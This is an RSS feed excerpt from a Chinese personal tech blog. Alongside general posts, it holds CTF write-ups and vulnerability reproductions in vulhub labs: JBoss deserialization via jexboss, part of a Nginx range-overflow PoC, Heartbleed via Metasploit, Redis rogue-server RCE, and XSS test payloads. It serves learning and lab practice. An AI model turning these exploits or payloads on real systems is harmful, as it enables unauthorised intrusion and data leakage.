+苹果设备安装应用后会向APNs服务器进行注册，注册成功后APNs服务器返回一个deviceToken，且二者之间会维持一个基于SSL协议的TCP流通讯的长连接。 拿到deviceToken后设备会将其发送至自建应用服务器 有消息需要被推送时，自建服务器会将消息按指定格式结合deviceToken一并打包发送给APNs。 APNs将新消息推送至设备，并在设备屏幕上显示出来(因为设备和服务器之间维持了一个长连接) 结合上述过程可以发现，真正完成推送的是APNs服务器，消息一定是由APNs服务器推送给我们的设备，自建应用服务器只是将需要推送的消息告诉APNs服务器。至于如何维护消息队列或如何保证消息能被推送到指定设备上，这些功能都是由APNs实现的。
+deviceToken deviceToken是一个APP安装在设备上的唯一标识符，一个APP在不同设备上的deviceToken不同，同一台设备重新安装同一个APP后deviceToken也会不同。
+项目代码AppDelegate中有一个回调方法，当APNs注册成功后通过该回调方法可以获取到返回的deviceToken。
+- (void)application:(UIApplication *)application didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken APNs拿到这个包之后会验证包结构是否正确，验证无误后会提取其中的消息，再将消息推送至指定设备。
+消息体结构如下:
+{ &amp;#34;aps&amp;#34;:{ &amp;#34;alert&amp;#34;:{	// 显示在用户设备上的推送标题内容 &amp;#34;title&amp;#34;:&amp;#34;Test Request&amp;#34;, &amp;#34;body&amp;#34;:&amp;#34;This is a test msg.&amp;#34;, }, &amp;#34;badge&amp;#34;:5,	// 显示的数量(整形类型)，是在应用icon右上角显示的数量，提示有几条未读信息 &amp;#34;sound&amp;#34;:&amp;#34;default&amp;#34;	// 推送消息声 } } 其实这就是一个JSON结构体，上述代码只是一种简单消息体，详情可见苹果官方文档:Local and Remote Notification Programming Guide: Creating the Remote Notification Payload (apple.</description>
+    </item>
+    
+    <item>
+      <title>Arm开发板联网配置</title>
+      <link>https://oopsdc.com/post/arm%E5%BC%80%E5%8F%91%E6%9D%BF%E8%81%94%E7%BD%91%E9%85%8D%E7%BD%AE/</link>
+      <pubDate>Tue, 20 Jul 2021 12:17:34 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/arm%E5%BC%80%E5%8F%91%E6%9D%BF%E8%81%94%E7%BD%91%E9%85%8D%E7%BD%AE/</guid>
+      <description>文章背景 使用S5P6818开发板时，有业务上云的需求，遂有本文，内容较少，仅涉及联网部分。
+问题描述 插上网线后无法获取IP 配置静态IP后无法ping通外网 解决方案 分两步解决。
+1.配置静态IP 方法一
+命令行配置:
+ifconfig eth0 &amp;lt;ip&amp;gt; netmask &amp;lt;netmask&amp;gt; 方法二
+写配置文件:
+vi /etc/init.d/rcS # 网卡开机自启 ifconfig eth0 up ifconfig eth0 &amp;lt;ip&amp;gt; netmask &amp;lt;netmask&amp;gt; 2.配置网关及DNS服务器 完成第一步后，可以ping通局域网下的主机，但无法ping通外网，出现如下报错:
+sendto: Network is unreachable 使用route命令查看路由表:
+Kernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface&amp;lt;ip&amp;gt; * 255.255.255.0 U 0 0 0 eth0 发现没有网关，配置网关:
+route add default gw &amp;lt;ip&amp;gt; 再使用route命令验证一下，确认配好。
+之后便要配置DNS解析，在/etc目录下新建一个resolv.conf配置文件，内容如下:
+#114 DNS服务器nameserver 114.114.114.114 #微软 DNS服务器nameserver 233.</description>
+    </item>
+    
+    <item>
+      <title>utterances博客评论插件</title>
+      <link>https://oopsdc.com/post/utterances%E5%8D%9A%E5%AE%A2%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6/</link>
+      <pubDate>Tue, 20 Jul 2021 09:10:00 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/utterances%E5%8D%9A%E5%AE%A2%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6/</guid>
+      <description>概述 utterances是一个基于GitHub issue，拥有多种主题的开源小组件，本文将简述使用如何在hugo博客部署utterances。
+配置过程 新建仓库 新建一个公开的仓库，用于存放评论，名字随意。作者在此处创建一个名为utterances的公开仓库。
+安装utterances GitHub Apps - utterances
+点击安装即可，选择仓库：
+安装完成后会自动跳转到官方页面。
+在文件中添加插件 官方文档:utterances
+修改footer.html文件，以PaperMod主题为例：
+&amp;lt;footer class=&amp;#34;footer&amp;#34;&amp;gt; {{- if .Site.Copyright }} &amp;lt;span&amp;gt;{{ .Site.Copyright | markdownify }}&amp;lt;/span&amp;gt; {{- else }} &amp;lt;span&amp;gt;&amp;amp;copy; {{ now.Year }} &amp;lt;a href=&amp;#34;{{ &amp;#34;&amp;#34; | absLangURL }}&amp;#34;&amp;gt;{{ .Site.Title }}&amp;lt;/a&amp;gt;&amp;lt;/span&amp;gt; {{- end }} &amp;lt;span&amp;gt;&amp;amp;middot;&amp;lt;/span&amp;gt; &amp;lt;span&amp;gt;Powered by &amp;lt;a href=&amp;#34;https://gohugo.io/&amp;#34; rel=&amp;#34;noopener noreferrer&amp;#34; target=&amp;#34;_blank&amp;#34;&amp;gt;Hugo&amp;lt;/a&amp;gt;&amp;lt;/span&amp;gt; &amp;lt;span&amp;gt;&amp;amp;middot;&amp;lt;/span&amp;gt; &amp;lt;span&amp;gt;Theme &amp;lt;a href=&amp;#34;https://git.io/hugopapermod&amp;#34; rel=&amp;#34;noopener&amp;#34; target=&amp;#34;_blank&amp;#34;&amp;gt;PaperMod&amp;lt;/a&amp;gt;&amp;lt;/span&amp;gt; &amp;lt;script src=&amp;#34;https://utteranc.es/client.js&amp;#34; repo=&amp;#34;oopsdc/utterances&amp;#34; issue-term=&amp;#34;title&amp;#34; theme=&amp;#34;github-light&amp;#34; crossorigin=&amp;#34;anonymous&amp;#34; async&amp;gt; &amp;lt;/script&amp;gt; &amp;lt;/footer&amp;gt; 运行命令hugo server进入一篇文章即可查看评论插件效果。</description>
+    </item>
+    
+    <item>
+      <title>ProxyChains简单使用</title>
+      <link>https://oopsdc.com/post/proxychains%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</link>
+      <pubDate>Fri, 09 Jul 2021 22:24:59 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/proxychains%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</guid>
+      <description>概述 ProxyChains是一个Linux和Unix下的代理工具，允许TCP和DNS通过代理隧道，支持HTTP、SOCKS4、SOCKS5类型的代理服务器，且可配置多个代理。
+ProxyChains通过用户自定义的代理列表强制连接指定的应用程序。
+本文简述kali下如何通过ProxyChains使用Windows主机代理。
+相关资料 GitHub项目地址 ProxyChains：haad/proxychains: proxychains - a tool that forces any TCP connection made by any given application to follow through proxy like TOR or any other SOCKS4, SOCKS5 or HTTP(S) proxy. Supported auth-types: &amp;ldquo;user/pass&amp;rdquo; for SOCKS4/5, &amp;ldquo;basic&amp;rdquo; for HTTP. (github.com)
+ProxyChains-ng：rofl0r/proxychains-ng: proxychains ng (new generation) - a preloader which hooks calls to sockets in dynamically linked programs and redirects it through one or more socks/http proxies. continuation of the unmaintained proxychains project.</description>
+    </item>
+    
+    <item>
+      <title>从0到1-CTFer成长之路</title>
+      <link>https://oopsdc.com/post/%E4%BB%8E0%E5%88%B01-ctfer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/</link>
+      <pubDate>Sat, 03 Jul 2021 18:59:29 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/%E4%BB%8E0%E5%88%B01-ctfer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/</guid>
+      <description>平台地址:N1BOOK平台-Nu1L Team
+第一章 Web入门 信息搜集 常见搜集 Des:一共3部分flag。
+环境搭建 docker-compose.yml：
+version: &amp;#39;3.2&amp;#39; services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-backk:latest ports: - 80:80 启动：
+docker-compose up -d 解题过程 既然说到了敏感文件，先试试robots.txt文件是否存在:
+User-agent: *Disallow:/flag1_is_her3_fun.txt 访问flag1_is_her3_fun.txt，获得第一部分flag。
+剩下的工作就是扫描后台了，分别访问index.php~和.index.php.swp。
+粗心的小李 Des:看看能不能找到信息吧?
+环境搭建 docker-compose.yml：
+version: &amp;#39;3.2&amp;#39; services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-git:latest ports: - 80:80 启动：
+docker-compose up -d 解题过程 Git泄露，找一下利用工具:gakki429/Git_Extract: 提取远程 git 泄露或本地 git 的工具 (github.com)
+使用后会在当前目录生成一个以网站命名的文件夹，cd进去，发现有一个index.html文件。flag就在其中。
+SQL注入 SQL注入-1 Des:N/A。
+环境搭建 docker-compose.yml：
+version: &amp;#39;3.2&amp;#39; services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-sql-1:latest ports: - 80:80 启动：</description>
+    </item>
+    
+    <item>
+      <title>自定义GitHub个人资料</title>
+      <link>https://oopsdc.com/post/%E8%87%AA%E5%AE%9A%E4%B9%89github%E4%B8%AA%E4%BA%BA%E8%B5%84%E6%96%99/</link>
+      <pubDate>Thu, 01 Jul 2021 21:33:33 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/%E8%87%AA%E5%AE%9A%E4%B9%89github%E4%B8%AA%E4%BA%BA%E8%B5%84%E6%96%99/</guid>
+      <description>概述 想自定义一下GitHub的个人资料自述文件，遂有本文。
+官方文档:管理个人资料自述文件 - GitHub Docs
+关于自述文件:关于自述文件 - GitHub Docs
+基本要求 创建一个与用户名相同的公开仓库 仓库根目录包含README.md文件 README.md文件不能为空 实现步骤 1.添加个人资料自述文件 1.新建仓库 在任意页面点击右上角的+号创建一个与自己用户名相同的仓库。当输入自己的用户名时，会出现一个小彩蛋。
+2.添加仓库说明(可选) 3.设置仓库为公共属性 4.使用自述文件初始化仓库 5.创建仓库并编辑README文档 生成的自述文件已由模板预先填充，也可自定义表情、符号。
+表情符号清单:🎁 Emoji cheat sheet for GitHub, Basecamp, Slack &amp;amp; more (webfx.com)
+在想要换行的文本前后加上&amp;lt;br&amp;gt;和&amp;lt;/br&amp;gt;即可，如:
+&amp;lt;br&amp;gt;This is test&amp;lt;/br&amp;gt; 2.删除个人资料自述文件 以下任一满足，个人资料自述文件就将会被删除:
+自述文件为空或不存在 仓库为私有仓库 仓库名与用户名不匹配 文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。</description>
+    </item>
+    
+    <item>
+      <title>信息搜集</title>
+      <link>https://oopsdc.com/post/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</link>
+      <pubDate>Fri, 25 Jun 2021 15:36:18 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</guid>
+      <description>信息收集概念 进行渗透测试之前，最重要的一步就是信息收集。
+信息收集的主要内容:收集服务器配置信息、网站敏感信息等，包括域名、子域名信息、目标网站系统CMS指纹、目标网站真实IP、开放端口等。
+1、收集域名信息 知道目标域名后，第一件事就是获取域名注册信息，包括域名DNS服务器信息及注册人联系信息等。
+Whois命令查询 概念:Whois是一个标准互联网协议，可用于收集网络注册信息，如注册域名、IP等。
+原理:Whois就是一个用于查询域名是否被注册及注册域名详细信息的数据库。
+作用:获得注册人姓名和邮箱，通过社工进一步获取其它信息。
+用法：
+whois baidu.com	在线Whois查询网站：
+站长工具_whois查询工具_爱站网 (aizhan.com)
+域名Whois查询 - 站长之家 (chinaz.com)
+VirusTotal
+2、查询备案信息 概念:网站备案是工具国家法律法规规定，需要网站所有者向国家有关部门申请的备案。这是国家信息产业部对网站的一种管理。
+注意:若网站搭建在其他国家，则不需进行备案。
+在线备案信息查询网站：
+天眼查-商业查询平台_企业信息查询_公司查询_工商查询_企业信用信息系统 (tianyancha.com)
+3、收集敏感信息 搜索关键字 通过搜索引擎构造特殊关键字语法来搜索互联网上的相关敏感信息。还可用其来收集数据库文件、SQL注入、配置信息、源码泄露、未授权访问和robots.txt等敏感信息。
+常用搜索语法(各搜索引擎大同小异)：
+语法 作用 Site 指定域名 Inurl URL存在关键字的网页 Intext 网页正文中的关键字 Filetype 指定文件类型 Intitle 网页标题中的关键字 link link:baidu.com 表示返回所有和baidu.com做了链接的URL Info 查找指定站点的基本信息 cache 搜索Google中关于某些内容的缓存 一般可以把语法结合使用以获得更准确的信息。
+使用Burp Suite的Repeater模块 将抓到的包发送至Repeater模块，查看服务器端的响应包。可以获得一些服务器信息，如Server类型及版本、PHP版本信息等。
+GitHub信息泄露 可以尝试在GitHub上搜寻敏感信息，如数据库连接信息、uc-key、阿里osskey、邮箱帐密等。
+4、收集子域名 子域名，即二级域名，指顶级域名之下的域名。假设目标网站规模较大，一般来说从主站入手都是极不理智的选择，这时我们就可以考虑从子域迂回接近目标。
+子域名检测工具 Layer子域名挖掘机：较为常用，有域名、解析IP、CDN列表、Web服务器和网站状态。
+subDomainBrute：用小字典递归发现三级、四级甚至是五级域名。
+Sublist3r：能列举多种资源，如在Google、Yahoo、Bing、Baidu和Ask等搜索引擎中可查到的子域名，还可列出Netcraft、VirusTota、ThreatCrow、DNSdumpster和Reverse DNS查到的子域名。
+利用搜索引擎语法 利用site语法搜索与某域名相关的网页信息。
+证书透明度公开日志枚举 证书透明度（Certificate Transparency, CT）:是证书授权机构(CA)的一个项目，证书授权机构会将每个SSL/TLS证书发布到公共日志中。
+SSL/TLS证书通常包含域名、子域名和邮件信息，这些也经常成为攻击者想获得的信息。
+在线网站：</description>
+    </item>
+    
+    <item>
+      <title>JBoss漏洞复现</title>
+      <link>https://oopsdc.com/post/jboss%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Thu, 17 Jun 2021 09:03:30 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/jboss%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>JBoss 4.x JBossMQ JMS 反序列化漏洞 CVE-2017-7504 漏洞描述 Red Hat JBoss Application Server是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JBossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，攻击者可借助特制的序列化数据利用该漏洞执行任意代码。
+影响版本 JBoss AS 4.x及之前。
+复现思路 漏洞复现 环境搭建：
+git clone https://github.com/vulhub/vulhub.git cd vulhub/jboss/CVE-2017-7504 docker-compose up -d Jexboss工具：joaomatosf/jexboss: JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool (github.com)
+git clone https://github.com/joaomatosf/jexboss.git python3 jexboss.py -host http://&amp;lt;ip&amp;gt;:8080 成功利用漏洞执行命令。
+文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。</description>
+    </item>
+    
+    <item>
+      <title>Nginx漏洞复现</title>
+      <link>https://oopsdc.com/post/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Thu, 17 Jun 2021 09:03:30 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>Nginx 越界读取缓存漏洞 CVE-2017-7529 漏洞描述 Nginx在反向代理站点的时候，通常会缓存一些文件，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括文件头+HTTP返回包头+HTTP返回包体。如果二次请求命中该缓存文件，Nginx会直接将该文件中的HTTP返回包体返回给用户。
+如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能读取到缓存文件中位于HTTP返回包体前的文件头、HTTP返回包头等内容。
+影响版本 Nginx 0.5.6 ~ 1.13.2
+复现思路 漏洞复现 环境搭建：
+git clone https://github.com/vulhub/vulhub.git cd vulhub/nginx/CVE-2017-7529 docker-compose up -d 访问:http://&amp;lt;ip&amp;gt;:8080正常即可。
+POC已经在当前目录中给出来，文件名poc.py：
+#!/usr/bin/env python import sys import requests if len(sys.argv) &amp;lt; 2: print(&amp;#34;%s url&amp;#34; % (sys.argv[0])) print(&amp;#34;eg: python %s http://your-ip:8080/&amp;#34; % (sys.argv[0])) sys.exit() headers = { &amp;#39;User-Agent&amp;#39;: &amp;#34;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240&amp;#34; } offset = 605 url = sys.argv[1] file_len = len(requests.</description>
+    </item>
+    
+    <item>
+      <title>服务器应用漏洞</title>
+      <link>https://oopsdc.com/post/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/</link>
+      <pubDate>Thu, 17 Jun 2021 09:03:30 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/</guid>
+      <description>OpenSSL OpenSSL 心脏滴血漏洞 CVE-2014-0160 漏洞描述 2014年4月7日，OpenSSL发布安全公告，在OpenSSL 1.0.1 ~ 1.0.1f Beta1版本中存在漏洞，漏洞名为HeartBleed。其中Heart是指该漏洞位于心跳协议上，Bleed是因为该漏洞会造成数据泄露。即HeartBleed是在心跳协议上的一个数据泄露漏洞，OpenSSL库中用到了该心跳协议。
+影响版本 OpenSSL 1.0.1、1.0.1a、1.0.1b、1.0.1c、1.0.1d、1.0.1e、1.0.1f、Beta 1 of OpenSSL 1.0.2等。
+复现思路 漏洞复现 环境搭建:
+git clone https://github.com/vulhub/vulhub.git cd vulhub/openssl/heartbleed docker-compose up -d 使用msf对目标进行攻击:
+msfconsole set RHOST &amp;lt;ip&amp;gt; set verbose true run Redis Redis 主从复制RCE 漏洞描述 在2019年7月7日结束的WCTF2019 Final上，LC/BC成员Pavel Toporkov在分享会上介绍了一种关于Redis新版本的RCE利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大。
+Pavel Toporkov的分享:
+15-redis-post-exploitation.pdf (zeronights.ru)
+影响版本 Redis &amp;lt;= 5.0.5
+复现思路 漏洞复现 环境搭建:
+docker pull a1143535418/redis5.0 docker run -p 6379:6379 -d a1143535418/redis5.0 redis-server 利用脚本:
+n0b0dyCN/redis-rogue-server: Redis(&amp;lt;=5.0.5) RCE (github.com)</description>
+    </item>
+    
+    <item>
+      <title>XSS Challenges</title>
+      <link>https://oopsdc.com/post/xss-challenges/</link>
+      <pubDate>Thu, 10 Jun 2021 21:03:39 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/xss-challenges/</guid>
+      <description>题目地址：https://xss-quiz.int21h.jp/
+Stage #1 Hint: Very simple&amp;hellip;
+直接输入测试语句：
+&amp;lt;sCript&amp;gt;alert(document.domain);&amp;lt;/Script&amp;gt; Stage #2 Hint: Close the current tag and add SCRIPT tag&amp;hellip;
+地址：XSS Challenges (by yamagata21) - Stage #2 (int21h.jp)
+上测试语句：
+&amp;lt;sCript&amp;gt;alert(document.domain);&amp;lt;/Script&amp;gt; 然后审查元素，只需要把input标签闭合就能执行我们的语句了。
+&amp;#34;&amp;gt;&amp;lt;sCript&amp;gt;alert(document.domain);&amp;lt;/Script&amp;gt; Stage #3 Hint: The input in text box is properly escaped.
+地址：XSS Challenges (by yamagata21) - Stage #3 (int21h.jp)
+这个页面有两个input标签，先在搜索框输入我们的测试语句试试。
+直接把我们的语句放到&amp;lt;b&amp;gt;标签里了，但是这旁边不是还有一个input标签吗。把两者的name互换一下即可。
+Stage #4 Hint: Invisible input field.
+地址：XSS Challenges (by yamagata21) - Stage #4 (int21h.jp)
+审查元素发现有三个input标签，第三个标签的属性是hidden，把它改为text，然后把input标签闭合。
+&amp;#34;&amp;gt;&amp;lt;sCript&amp;gt;alert(document.domain);&amp;lt;/Script&amp;gt; Stage #5 Hint: Length limited text box.</description>
+    </item>
+    
+    <item>
+      <title>Test</title>
+      <link>https://oopsdc.com/post/test/</link>
+      <pubDate>Fri, 28 May 2021 21:03:39 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/test/</guid>
+      <description>He11o, th1s 1s a test!
+#include &amp;lt;stdio.h&amp;gt; int main() { pritnf(&amp;#34;Hello World!&amp;#34;); } 文章许可:本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。</description>
+    </item>
+    
+    <item>
+      <title>网站镜像克隆</title>
+      <link>https://oopsdc.com/post/%E7%BD%91%E7%AB%99%E9%95%9C%E5%83%8F%E5%85%8B%E9%9A%86/</link>
+      <pubDate>Tue, 20 Apr 2021 22:06:50 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/%E7%BD%91%E7%AB%99%E9%95%9C%E5%83%8F%E5%85%8B%E9%9A%86/</guid>
+      <description>使用wget克隆网站 使用方法 我们可以使用man wget命令查看帮助文档。
+操作命令及参数解释如下：
+wget -m -p -E -k -K -np -v https://www.baidu.com/ # 参数解释 -m	:	镜像，选择该选项适用于Web站点 -p	:	页面获取的先决条件，该选项确保包含了请求的图片和css脚本文件被下载(可以更好复制html5站点) -E	:	适用于拓展，可以在本地另存一个html文件 -k	:	转换链接，确保文件本转换，适用于本地浏览 -K	:	转换备份文件，将以orig为后缀作为原始文件 -np	:	不要到上一层子目录中 -v	:	显示过程，不显示过程为-nv 克隆结果 # 克隆后在当前目录下会出现一个与网站同名的子目录，树形结构如下 www.baidu.com ├── index.html ├── index.html.orig └── robots.txt 0 directories, 3 files 使用HTTrack克隆网站 使用方法 httrack # 进入软件后需要输入项目名 baidu # 克隆后的存放地址 /home/oopsdc/Desktop # 要克隆的网站地址 www.baidu.com # 有6个选项，此处我们选2，具有向导递归层级的镜像网站 2 # 接下来的部分全选默认选项 默认回车 克隆结果 baidu ├── backblue.</description>
+    </item>
+    
+    <item>
+      <title>Docker</title>
+      <link>https://oopsdc.com/post/docker/</link>
+      <pubDate>Tue, 13 Apr 2021 22:06:50 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/docker/</guid>
+      <description>Docker概述 镜像（image）：
+一个只读模板。一个镜像可以用来创建多个Docker容器，好似Java中的类和对象，镜像是类，容器是对象。 容器（container）：
+Docker利用容器独立运行一个或一组应用，容器是用镜像创建的运行实例。容器可以被启动、开始、停止、删除。每个容器都是相互个隔离的。也可以把容器看做一个简易版Linux环境(包括root用户权限、进程空间、用户空间和网络空间等)及运行在其中的应用程序。容器的定义和镜像几乎一模一样，也是一堆层的统一视角，唯一区别在于容器最上面一层可读可写。 仓库（repository）：
+仓库是集中存放镜像文件的场所。仓库和仓库注册服务器(registry)是有区别的，后者往往存在多个仓库，每个仓库又存在多个镜像，每个镜像有不同的标签。仓库分为公开仓库和私有仓库两种形式。最大的公开仓库是Docker Hub，国内最大的为阿里云、网易云等。 Docker安装 环境:CentOS 7
+1.官方文档
+2.yum安装gcc相关环境：
+yum -y install gcc yum -y install gcc-c++ 3.卸载旧版本：
+yum remove docker \ docker-client \ docker-client-latest \ docker-common \ docker-latest \ docker-latest-logrotate \ docker-logrotate \ docker-engine 4.安装依赖包：
+yum install -y yum-utils 5.设置镜像仓库：
+# 错误 yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo ## 报错 [Errno 14] curl#35 - TCP connection reset by peer [Errno 12] curl#35 - Timeout # 推荐国内镜像 yum-config-manager --add-repo http://mirrors.</description>
+    </item>
+    
+    <item>
+      <title>Golang</title>
+      <link>https://oopsdc.com/post/golang/</link>
+      <pubDate>Tue, 13 Apr 2021 22:06:50 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/golang/</guid>
+      <description>runoob教程:Go 语言教程 | 菜鸟教程 (runoob.com)
+环境搭建 安装包官方下载地址：Downloads - The Go Programming Language (golang.org)
+国内能打开的地址：Downloads - The Go Programming Language (google.cn)
+Windows安装go 安装包下载 这里我选择下载msi文件的go1.16.2.windows-amd64.zip压缩包，然后放在环境目录D:\Env\go1.16.2\bin下解压。
+环境配置 将go目录下的/bin路径添加到Path环境变量中，点击新建。
+D:\Env\go1.16.2\bin 检测安装 打开cmd输入go。
+hello-world 在工作目录创建hello.go文件。
+package main import &amp;#34;fmt&amp;#34; func main() { fmt.Println(&amp;#34;Hello, World!&amp;#34;) } 使用go run命令运行:
+go run hello.go go build生成二进制文件运行:
+&amp;gt; go build .\hello.go &amp;gt; ls Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 2021/3/15 10:50 2094592 hello.exe -a---- 2021/3/15 10:47 79 hello.</description>
+    </item>
+    
+    <item>
+      <title>GTK&#43;</title>
+      <link>https://oopsdc.com/post/gtk&#43;/</link>
+      <pubDate>Sat, 27 Mar 2021 22:06:50 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/gtk&#43;/</guid>
+      <description>GTK+简介 GTK+(Gnome Toolkit+)最初是为GIMP(GNU Image Manipulation Program)写的，在开发早期GIMP版本时，Peter Mattis 和 Spencer Kimball创建了GTK(GIMP Toolkit)作为Motif收费工具包的替代。当GTK获得了面向对象特性和可扩展性后，才变为了GTK+。
+GTK+特点 稳定、跨平台、多语言绑定、接口丰富、与时俱进、算法丰富、移动嵌入式应用广泛.
+学习手册 GTK+2手册：GTK+ 2 Reference Manual - GNOME Developer Center GTK+3手册：GTK+ 3 Reference Manual - GNOME Developer Center 中文手册：介绍 - 《GTK+3 参考手册》 - 书栈网 · BookStack GTK程序简介 使用gcc编译时加上pkg-config --cflags --libs gtk+-2.0，或者直接使用makefile编译
+例: gcc demo.c -o demo `pkg-config --cflags --libs gtk+-2.0` 自动获得预处理参数，如宏定义、头文件位置 自动获得链接参数，如库、依赖库位置、文件名及其它参数 GTK程序基本框架 #include &amp;lt;gtk/gtk.h&amp;gt; int main(int argc, char *argv[]) { gtk_init(&amp;amp;argc, &amp;amp;argv);	// 初始化 // 代码区 gtk_main();	// 主事件循环 return 0; } 分析：</description>
+    </item>
+    
+    <item>
+      <title>My 1st post</title>
+      <link>https://oopsdc.com/post/my-1st-post/</link>
+      <pubDate>Tue, 15 Sep 2020 11:30:03 +0000</pubDate>
+      
+      <guid>https://oopsdc.com/post/my-1st-post/</guid>
+      <description>Desc Text.</description>
+    </item>
+    
+    <item>
+      <title>Bugku</title>
+      <link>https://oopsdc.com/post/bugku/</link>
+      <pubDate>Mon, 13 Apr 2020 22:06:50 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/bugku/</guid>
+      <description>Bugku Web Web1 Des：flag{}。
+查看源码即可。
+Web2 Des：输入验证码即可得到flag。
+输入框有输入长度限制，在控制台修改长度即可。
+Web3 Des：flag{}。
+通过get传参，按照题目要求直接传入
+?what=flag Web4 Des:post。
+方法1 利用hackbar直接post传参。
+方法2 利用burp抓包传值。
+方法3 编写python脚本。
+import requests s = requests.Session() r = s.get(&amp;#34;&amp;lt;url&amp;gt;&amp;#34;) value = {&amp;#39;what&amp;#39;:&amp;#39;flag&amp;#39;} r = s.post(&amp;#34;&amp;lt;url&amp;gt;&amp;#34;, value) print(r.text) 题目更新 Des:看看源代码吧。
+查看源代码，发现有两串编码字符串，分别对两个字符串进行URL解码，按照代码含义将其组合起来，放到控制台Console里排版。
+将if判断里与a.value判等的值输入提交框，提交。
+获得flag。
+Web5 Des:矛盾。
+$num = $_GET[&amp;#39;num&amp;#39;]; if (!isnumeric($num)) { echo $num; if ($num == 1) echo &amp;#39;flag{********}&amp;#39;; } 利用1a绕过，例：
+?num=1a01 Web6 Des:flag{}。
+查看源码。
+Unicode编码，解码即可。
+Web7 Des:你必须让它停下。
+burp抓包，使用重放(Repeater)模块不断点击go发送页面，注意查看response。
+Web8 Des:文件包含。
+打开题目获得代码：</description>
+    </item>
+    
+    <item>
+      <title>攻防世界</title>
+      <link>https://oopsdc.com/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</link>
+      <pubDate>Fri, 03 Jan 2020 22:06:50 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</guid>
+      <description>攻防世界 Web view source Des：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。
+查看页面源码。
+获得flag。
+robots Des：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。
+在URL后加上robots.txt，得到一个php页面提示，访问对应php文件。
+获得flag。
+backup Des：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！
+尝试backup.php，无效。
+使用御剑扫描后台，得到index.php.bak，输入后下载备份文件，cat查看。
+获得flag。
+cookie Des：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想:‘这是夹心饼干的意思吗？’
+使用burp抓包，得到cookie.php。
+继续使用burp抓包，查看Response。
+获得flag。
+disable_button Des：N/A。
+页面的flag按钮无响应，猜测被禁用，查看控制台元素。
+&amp;lt;input class=&amp;#34;btn btn-default&amp;#34; disabled&amp;gt; 将此处的disabled前三字符删除，改为abled，按下按钮。
+获得flag。
+weak_auth Des：小宁写了一个登陆验证页面，随手就设了一个密码。
+查看源码。
+&amp;lt;from class=&amp;#34;form-inline&amp;#34; method=&amp;#34;post&amp;#34; action=&amp;#34;./check.php&amp;#34;&amp;gt; 有一个验证页面，访问它。
+页面空白，查看源码，提示。
+&amp;lt;!--maybe you need a dictionary--&amp;gt; 这道题或许不需要字典？
+尝试御剑扫描，无果。
+好的我错了，随机输入用户名和密码，使用burp抓包，response显示用户名必须为admin，初次爆破无果，手动尝试123456，正确&amp;hellip;.如果尝试继续用字典的话还是可以爆出来，只是比较费时间。
+获得flag。
+simple_php Des：小宁听说php是最好的语言，于是她简单学习之后写了几行php代码。
